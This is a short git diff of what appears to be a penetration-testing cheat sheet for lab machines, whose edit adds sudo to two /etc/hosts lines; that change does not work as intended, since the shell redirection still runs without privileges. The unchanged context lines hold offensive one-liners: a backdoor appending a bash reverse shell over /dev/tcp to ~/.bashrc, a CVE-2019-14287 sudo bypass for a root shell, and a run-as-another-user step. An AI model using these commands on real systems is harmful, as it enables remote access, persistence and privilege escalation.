@@ -30,8 +30,8 @@ ssh user@10.10.10.10 -i id_rsa
 ---------------------------------------------------------------------
 echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' >> ~/.bashrc # backdoor in target
 ---------------------------------------------------------------------
-echo "10.10.10.10 webenum.thm" >> /etc/hosts
-echo "10.10.10.10 mysubdomain.webenum.thm" >> /etc/hosts
+sudo echo "10.10.10.10 webenum.thm" >> /etc/hosts
+sudo echo "10.10.10.10 mysubdomain.webenum.thm" >> /etc/hosts
 ---------------------------------------------------------------------
 sudo -u#-1 /bin/bash # CVE-2019-14287
 sudo -u silvio /usr/bin/zip # run with another user
